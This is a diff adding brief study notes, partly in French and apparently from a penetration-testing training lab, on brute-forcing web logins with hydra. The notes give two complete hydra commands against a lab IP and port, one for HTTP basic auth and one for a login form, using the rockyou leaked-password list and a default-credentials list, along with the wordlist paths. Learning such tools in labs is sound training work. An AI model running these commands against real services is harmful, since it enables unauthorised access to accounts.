@@ -1,0 +1,10 @@
+exp:
+hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
+hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+Remarque: fail condition (F=), on ne met pas class='...' si c'est un elem div. et on remplace les " par des '
+
+*We can check out the SecLists Repo for wordlists :
+ (password wordlists in our PwnBox in /opt/useful/SecLists/Passwords/, 
+ and username wordlists in /opt/useful/SecLists/Usernames/)
+ combinaison username/pass par default: /opt/useful/SecLists/Passwords/Default-Credentials
+ most common password: /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt (https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
